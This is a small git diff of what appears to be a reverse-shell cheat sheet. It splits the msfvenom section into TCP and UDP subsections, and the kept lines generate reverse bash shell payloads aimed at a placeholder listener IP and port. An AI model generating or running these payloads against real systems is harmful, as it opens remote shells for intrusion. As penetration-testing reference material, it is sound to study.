@@ -42,11 +42,15 @@ $ echo <base64_payload> | basenc --base64 -d
 
 ## 03 - Generate via `msfvenom`
 
+### 3.1 - TCP Method
+
 ```
 $ msfvenom -p cmd/unix/reverse_bash lhost=<IP> lport=<PORT>
+```
 
-$ msfvenom -p cmd/unix/reverse_bash_telnet_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
+### 3.2 - UDP Method
 
+```
 $ msfvenom -p cmd/unix/reverse_bash_udp lhost=<IP> lport=<PORT>
 ```
 
